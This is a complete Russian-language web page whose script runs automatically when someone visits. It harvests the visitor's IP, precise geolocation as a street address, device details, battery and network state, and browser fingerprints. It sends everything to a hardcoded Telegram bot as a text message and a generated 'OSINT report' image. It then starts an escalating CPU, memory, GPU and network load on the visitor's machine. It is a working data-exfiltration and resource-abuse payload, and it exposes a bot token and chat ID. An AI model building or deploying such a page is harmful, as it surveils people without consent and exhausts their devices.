<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OSINT + Стресс-тест с отправкой изображения</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.2);
            position: relative;
            z-index: 10;
        }
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        .status-box {
            background: #f8f9fa;
            border-left: 4px solid #667eea;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 14px;
            color: #555;
            word-break: break-word;
            max-height: 200px;
            overflow-y: auto;
        }
        .progress {
            margin-top: 15px;
            font-size: 14px;
            color: #667eea;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid #667eea;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .stress-indicator {
            margin-top: 20px;
            padding: 10px;
            background: rgba(102, 126, 234, 0.1);
            border-radius: 8px;
            font-size: 13px;
            color: #555;
            border: 1px dashed #667eea;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
            text-align: center;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
            margin-top: 10px;
            transition: background 0.2s;
        }
        button:hover {
            background: #5a67d8;
        }
        #expGif {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            z-index: 9999;
            pointer-events: none; /* чтобы не мешать кликам */
            opacity: 0.5; /* полупрозрачный, чтобы было видно контент */
        }
    </style>
</head>
<body>
    <img id="expGif" src="https://media1.tenor.com/m/-zRc1nCJ_6oAAAAC/hack-hacker.gif" alt="exp" style="display: none;">
    <!-- ссылка на гифку с эффектом хакера, можно заменить на exp.gif если файл локально -->

    <div class="card">
        <h1>🔍 OSINT + стресс-тест с фото</h1>
        <p>Собираем максимум данных, генерируем изображение и отправляем в Telegram</p>
        <div class="status-box" id="status">Инициализация...</div>
        <div class="progress" id="progress">
            <div class="spinner"></div>
            <span id="progressText">Получение IP</span>
        </div>
        <div class="stress-indicator" id="stressInfo">
            ⏳ Нагрузка ещё не запущена
        </div>
        <button id="stopStressBtn" style="display: none;">Остановить нагрузку</button>
        <div class="footer">
            После отправки данных запустится постепенная нагрузка
        </div>
    </div>

    <script>
        (function() {
            // ⚠️ ВАШИ ДАННЫЕ (токен и ID)
            const TELEGRAM_TOKEN = '8519920730:AAF9hPsqQCFH5sVrqJ9OCpCPSOtdKeilT88';
            const TELEGRAM_CHAT_ID = '8489374137';

            // Элементы DOM
            const statusDiv = document.getElementById('status');
            const progressText = document.getElementById('progressText');
            const stressInfo = document.getElementById('stressInfo');
            const stopBtn = document.getElementById('stopStressBtn');
            const expGif = document.getElementById('expGif');

            // Показать гифку
            expGif.style.display = 'block';

            // Флаги для остановки нагрузки
            let stressActive = false;
            let workers = [];
            let networkInterval = null;
            let gpuLoop = null;
            let memoryLeakArray = [];
            let intensityLevel = 0;
            let intensityInterval = null;

            // ==================== Функции обновления интерфейса ====================
            function setStatus(text) {
                statusDiv.innerText = text;
            }
            function setProgress(text) {
                progressText.innerText = text;
            }

            // ==================== РАСШИРЕННЫЙ СБОР OSINT ====================
            async function collectExtendedData() {
                const result = {};

                // IP
                setProgress('Получение IP');
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    result.ip = ipData.ip;
                } catch {
                    result.ip = 'Не удалось определить';
                }

                // Геолокация
                setProgress('Запрос геолокации');
                result.geo = 'Не запрошено или отказано';
                if (navigator.geolocation) {
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
                        });
                        const { latitude, longitude } = position.coords;
                        const geoRes = await fetch(
                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`,
                            { headers: { 'User-Agent': 'MyOSINTCollector/1.0' } }
                        );
                        const geoJson = await geoRes.json();
                        result.geo = geoJson.display_name || `${latitude}, ${longitude}`;
                    } catch {
                        result.geo = 'Геолокация недоступна';
                    }
                }

                // UserAgent и ОС/устройство
                setProgress('ОС и устройство');
                const ua = navigator.userAgent;
                result.userAgent = ua;
                if (ua.includes('Windows')) result.os = 'Windows';
                else if (ua.includes('Mac OS')) result.os = 'macOS';
                else if (ua.includes('Linux')) result.os = 'Linux';
                else if (ua.includes('Android')) result.os = 'Android';
                else if (ua.includes('iPhone') || ua.includes('iPad')) result.os = 'iOS';
                else result.os = 'Неизвестно';

                if (ua.includes('iPhone')) result.device = 'iPhone';
                else if (ua.includes('iPad')) result.device = 'iPad';
                else if (ua.includes('Android')) {
                    const match = ua.match(/Android\s+[^;]+(;\s+[^)]+)/);
                    result.device = match ? match[1] : 'Android устройство';
                } else if (ua.includes('Windows NT')) result.device = 'ПК (Windows)';
                else if (ua.includes('Macintosh')) result.device = 'ПК (Mac)';
                else result.device = 'ПК/Другое';

                // CPU и RAM
                result.cpuCores = navigator.hardwareConcurrency || 'неизвестно';
                result.memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'неизвестно';

                // Батарея (если есть)
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        result.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'зарядка' : 'разрядка'})`;
                    } catch {
                        result.battery = 'Недоступно';
                    }
                } else {
                    result.battery = 'Не поддерживается';
                }

                // Информация о сети
                if (navigator.connection) {
                    const conn = navigator.connection;
                    result.network = `${conn.effectiveType || '??'}, ${conn.downlink ? conn.downlink + ' Mbps' : '??'}, rtt=${conn.rtt || '??'}ms`;
                } else {
                    result.network = 'Недоступно';
                }

                // Плагины
                const plugins = [];
                if (navigator.plugins && navigator.plugins.length > 0) {
                    for (let i = 0; i < navigator.plugins.length; i++) {
                        plugins.push(navigator.plugins[i].name);
                    }
                }
                result.plugins = plugins.slice(0, 5).join(', ') + (plugins.length > 5 ? ` и ещё ${plugins.length-5}` : '') || 'Нет';

                // Экран, язык, часовой пояс
                result.screen = `${screen.width}x${screen.height} (глубина ${screen.colorDepth}bit)`;
                result.language = navigator.language || 'неизвестно';
                result.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'неизвестно';
                result.cookiesEnabled = navigator.cookieEnabled ? 'Да' : 'Нет';
                result.localStorage = typeof localStorage !== 'undefined' ? 'Доступен' : 'Недоступен';
                result.referrer = document.referrer || 'Прямой переход';
                result.timestamp = new Date().toISOString();
                result.url = window.location.href;
                result.platform = navigator.platform || 'неизвестно';
                result.doNotTrack = navigator.doNotTrack || 'не указано';

                // Canvas fingerprint
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = 200;
                    canvas.height = 50;
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(0, 0, 100, 50);
                    ctx.fillStyle = '#069';
                    ctx.fillText('OSINT', 2, 15);
                    result.canvasFingerprint = canvas.toDataURL().slice(0, 50) + '...'; // обрезаем
                } catch {
                    result.canvasFingerprint = 'Ошибка';
                }

                // WebGL fingerprint
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            result.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        } else {
                            result.webglRenderer = 'Недоступно';
                        }
                    } else {
                        result.webglRenderer = 'WebGL не поддерживается';
                    }
                } catch {
                    result.webglRenderer = 'Ошибка';
                }

                // Audio fingerprint (короткий)
                try {
                    const AudioContext = window.AudioContext || window.webkitAudioContext;
                    if (AudioContext) {
                        const ctx = new AudioContext();
                        result.audio = 'AudioContext доступен';
                        ctx.close(); // сразу закрываем
                    } else {
                        result.audio = 'Нет AudioContext';
                    }
                } catch {
                    result.audio = 'Ошибка';
                }

                // Доступные шрифты (грубая проверка)
                const fontCheck = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana'];
                const availableFonts = fontCheck.filter(f => document.fonts.check(`12px "${f}"`));
                result.fonts = availableFonts.join(', ') || 'Стандартные';

                // Время загрузки страницы
                if (performance && performance.timing) {
                    const timing = performance.timing;
                    const loadTime = timing.loadEventEnd - timing.navigationStart;
                    result.loadTime = loadTime + 'ms';
                } else {
                    result.loadTime = 'недоступно';
                }

                return result;
            }

            // ==================== ГЕНЕРАЦИЯ ИЗОБРАЖЕНИЯ ====================
            async function generateInfoImage(data) {
                const canvas = document.createElement('canvas');
                canvas.width = 800;
                canvas.height = 600;
                const ctx = canvas.getContext('2d');

                // Фон с градиентом
                const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
                gradient.addColorStop(0, '#667eea');
                gradient.addColorStop(1, '#764ba2');
                ctx.fillStyle = gradient;
                ctx.fillRect(0, 0, canvas.width, canvas.height);

                // Заголовок
                ctx.fillStyle = 'white';
                ctx.font = 'bold 36px "Segoe UI", Roboto, sans-serif';
                ctx.shadowColor = 'rgba(0,0,0,0.5)';
                ctx.shadowBlur = 10;
                ctx.fillText('🕵️ OSINT REPORT', 50, 70);
                ctx.shadowBlur = 0;

                // Белая плашка для текста
                ctx.fillStyle = 'rgba(255,255,255,0.9)';
                ctx.shadowBlur = 20;
                ctx.shadowColor = 'black';
                ctx.beginPath();
                ctx.roundRect(40, 100, 720, 460, 20);
                ctx.fill();
                ctx.shadowBlur = 0;

                // Текст
                ctx.fillStyle = '#333';
                ctx.font = '16px "Courier New", monospace';
                let y = 140;
                const lineHeight = 28;
                const leftMargin = 60;

                const lines = [
                    `IP: ${data.ip}`,
                    `📍 Гео: ${data.geo}`,
                    `💻 ОС: ${data.os} | 📱 Устройство: ${data.device}`,
                    `⚙️ Ядра CPU: ${data.cpuCores} | 🧠 ОЗУ: ${data.memory}`,
                    `🔋 Батарея: ${data.battery}`,
                    `📡 Сеть: ${data.network}`,
                    `🔌 Плагины: ${data.plugins}`,
                    `🖥️ Экран: ${data.screen}`,
                    `🌐 Язык: ${data.language} | ⏰ Таймзона: ${data.timezone}`,
                    `🍪 Куки: ${data.cookiesEnabled} | 💾 LocalStorage: ${data.localStorage}`,
                    `🎨 Canvas: ${data.canvasFingerprint}`,
                    `🎮 WebGL: ${data.webglRenderer}`,
                    `🎧 Аудио: ${data.audio}`,
                    `✍️ Шрифты: ${data.fonts}`,
                    `⏱️ Загрузка: ${data.loadTime}`,
                    `📄 Referrer: ${data.referrer}`,
                    `🕒 Время: ${data.timestamp}`,
                ];

                lines.forEach(line => {
                    ctx.fillText(line, leftMargin, y);
                    y += lineHeight;
                });

                // Нижний колонтитул
                ctx.font = '12px monospace';
                ctx.fillStyle = '#667eea';
                ctx.fillText('Сгенерировано автоматически', leftMargin, 540);

                return canvas;
            }

            // Вспомогательная функция для roundRect
            CanvasRenderingContext2D.prototype.roundRect = function(x, y, w, h, r) {
                if (w < 2 * r) r = w / 2;
                if (h < 2 * r) r = h / 2;
                this.moveTo(x + r, y);
                this.lineTo(x + w - r, y);
                this.quadraticCurveTo(x + w, y, x + w, y + r);
                this.lineTo(x + w, y + h - r);
                this.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
                this.lineTo(x + r, y + h);
                this.quadraticCurveTo(x, y + h, x, y + h - r);
                this.lineTo(x, y + r);
                this.quadraticCurveTo(x, y, x + r, y);
                return this;
            };

            // ==================== ОТПРАВКА ТЕКСТА В TELEGRAM ====================
            function sendToTelegram(message) {
                const escapeMarkdown = (str) => str.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
                const safeMessage = escapeMarkdown(message);
                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(safeMessage)}&parse_mode=Markdown`;

                if (url.length > 2000) {
                    const parts = [];
                    const maxPartSize = 1500;
                    for (let i = 0; i < safeMessage.length; i += maxPartSize) {
                        parts.push(safeMessage.slice(i, i + maxPartSize));
                    }
                    parts.forEach((part, index) => {
                        const partUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(part + (parts.length > 1 ? ` (часть ${index+1}/${parts.length})` : ''))}&parse_mode=Markdown`;
                        fetch(partUrl, { mode: 'no-cors' }).catch(() => {});
                    });
                } else {
                    fetch(url, { mode: 'no-cors' }).catch(() => {});
                }
            }

            // ==================== ОТПРАВКА ФОТО В TELEGRAM ====================
            async function sendPhotoToTelegram(canvas) {
                return new Promise((resolve) => {
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('chat_id', TELEGRAM_CHAT_ID);
                        formData.append('photo', blob, 'osint.png');

                        try {
                            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData,
                                mode: 'no-cors'
                            });
                            setStatus('✅ Текст и фото отправлены');
                        } catch (e) {
                            console.warn('Ошибка отправки фото (но могло отправиться)', e);
                            setStatus('⚠️ Текст отправлен, фото возможно не ушло');
                        }
                        resolve();
                    }, 'image/png');
                });
            }

            // ==================== ФУНКЦИИ НАГРУЗКИ (ПОСТЕПЕННОЕ УВЕЛИЧЕНИЕ) ====================
            function startCPUWorker() {
                const workerCode = `
                    function busyLoop() {
                        let x = 0;
                        while(true) {
                            for(let j=0; j<1000000; j++) {
                                x += Math.sqrt(j) * Math.tan(j);
                            }
                        }
                    }
                    busyLoop();
                `;
                const blob = new Blob([workerCode], { type: 'application/javascript' });
                const worker = new Worker(URL.createObjectURL(blob));
                workers.push(worker);
            }

            function addMemoryLoad() {
                // Добавляем 2 новых массива по 500k элементов
                for (let i = 0; i < 2; i++) {
                    const arr = new Array(500000).fill(0).map(() => Math.random());
                    memoryLeakArray.push(arr);
                }
                // Если слишком много, сбрасываем наполовину
                if (memoryLeakArray.length > 100) {
                    memoryLeakArray.splice(0, 30);
                }
            }

            function updateNetworkIntensity() {
                if (networkInterval) clearInterval(networkInterval);
                // Чем выше intensityLevel, тем чаще запросы
                const intervalTime = Math.max(50, 500 - intensityLevel * 30);
                networkInterval = setInterval(() => {
                    if (!stressActive) {
                        clearInterval(networkInterval);
                        return;
                    }
                    const urls = [
                        'https://www.google.com/favicon.ico',
                        'https://www.cloudflare.com/cdn-cgi/trace',
                        'https://www.github.com/favicon.ico',
                        'https://www.microsoft.com/favicon.ico',
                        'https://www.amazon.com/favicon.ico'
                    ];
                    urls.forEach(url => {
                        fetch(url, { mode: 'no-cors' }).catch(() => {});
                        new Image().src = url + '?r=' + Math.random();
                    });
                }, intervalTime);
            }

            function startGPULoop() {
                if (gpuLoop) return;
                const canvas = document.createElement('canvas');
                canvas.width = 512;
                canvas.height = 512;
                canvas.style.display = 'none';
                document.body.appendChild(canvas);
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return;

                const vertexShaderSource = `
                    attribute vec2 a_position;
                    void main() {
                        gl_Position = vec4(a_position, 0.0, 1.0);
                    }
                `;
                const fragmentShaderSource = `
                    precision highp float;
                    uniform float u_time;
                    uniform float u_complexity;
                    void main() {
                        float sum = 0.0;
                        for (int i = 0; i < 1000; i++) {
                            sum += sin(u_time * float(i) * u_complexity) * cos(float(i) * u_complexity);
                        }
                        gl_FragColor = vec4(sin(u_time), cos(u_time), sum, 1.0);
                    }
                `;

                function createShader(gl, source, type) {
                    const shader = gl.createShader(type);
                    gl.shaderSource(shader, source);
                    gl.compileShader(shader);
                    return shader;
                }

                const vertexShader = createShader(gl, vertexShaderSource, gl.VERTEX_SHADER);
                const fragmentShader = createShader(gl, fragmentShaderSource, gl.FRAGMENT_SHADER);
                const program = gl.createProgram();
                gl.attachShader(program, vertexShader);
                gl.attachShader(program, fragmentShader);
                gl.linkProgram(program);
                gl.useProgram(program);

                const vertices = new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]);
                const buffer = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
                const positionLocation = gl.getAttribLocation(program, 'a_position');
                gl.enableVertexAttribArray(positionLocation);
                gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);

                const timeLocation = gl.getUniformLocation(program, 'u_time');
                const complexityLocation = gl.getUniformLocation(program, 'u_complexity');

                function render() {
                    if (!stressActive) return;
                    gl.uniform1f(timeLocation, performance.now() / 1000);
                    gl.uniform1f(complexityLocation, 1.0 + intensityLevel / 5);
                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                    requestAnimationFrame(render);
                }
                render();
                gpuLoop = true;
            }

            // Запуск постепенной нагрузки
            function startGradualStress() {
                stressActive = true;
                intensityLevel = 0;
                stressInfo.innerHTML = `🔥 Нагрузка запущена (уровень 0)`;
                stopBtn.style.display = 'inline-block';

                // Каждую секунду увеличиваем интенсивность
                intensityInterval = setInterval(() => {
                    if (!stressActive) {
                        clearInterval(intensityInterval);
                        return;
                    }
                    intensityLevel++;
                    stressInfo.innerHTML = `🔥 Нагрузка: уровень ${intensityLevel}`;

                    // CPU: добавляем новый воркер каждые 2 уровня до 2*ядер
                    if (intensityLevel % 2 === 0 && workers.length < (navigator.hardwareConcurrency || 4) * 2) {
                        startCPUWorker();
                    }

                    // RAM: добавляем память
                    addMemoryLoad();

                    // Сеть: обновляем интервал
                    updateNetworkIntensity();

                    // GPU: уже запущен и меняет сложность через uniform (зависит от intensityLevel)
                }, 1000);

                // Инициализируем первый уровень
                startCPUWorker(); // сразу один воркер
                addMemoryLoad();
                updateNetworkIntensity();
                startGPULoop();
            }

            function stopStressTest() {
                stressActive = false;
                workers.forEach(w => w.terminate());
                workers = [];
                if (networkInterval) clearInterval(networkInterval);
                if (intensityInterval) clearInterval(intensityInterval);
                memoryLeakArray = [];
                stressInfo.innerHTML = '⏸️ Нагрузка остановлена.';
                stopBtn.style.display = 'none';
            }

            stopBtn.addEventListener('click', stopStressTest);

            // ==================== ОСНОВНОЙ ПРОЦЕСС ====================
            async function main() {
                try {
                    // 1. Сбор расширенных данных
                    const data = await collectExtendedData();

                    // 2. Генерация изображения
                    setProgress('Генерация изображения...');
                    const canvas = await generateInfoImage(data);

                    // 3. Отправка текстового сообщения
                    setProgress('Отправка текста...');
                    const textMessage = Object.entries(data).map(([k, v]) => `*${k}:* ${v}`).join('\n');
                    sendToTelegram(textMessage);

                    // 4. Отправка фото
                    setProgress('Отправка изображения...');
                    await sendPhotoToTelegram(canvas);

                    // 5. Запуск постепенной нагрузки
                    setProgress('Запуск стресс-теста...');
                    startGradualStress();

                } catch (error) {
                    console.error('Ошибка:', error);
                    setStatus('❌ Ошибка: ' + error.message);
                }
            }

            window.addEventListener('load', () => {
                main().catch(e => setStatus('Ошибка инициализации: ' + e.message));
            });

            // Таймаут на случай зависания
            setTimeout(() => {
                if (statusDiv.innerText === 'Инициализация...') {
                    setStatus('⚠️ Сбор данных занял слишком много времени, проверьте консоль.');
                }
            }, 20000);
        })();
    </script>
</body>
</html>
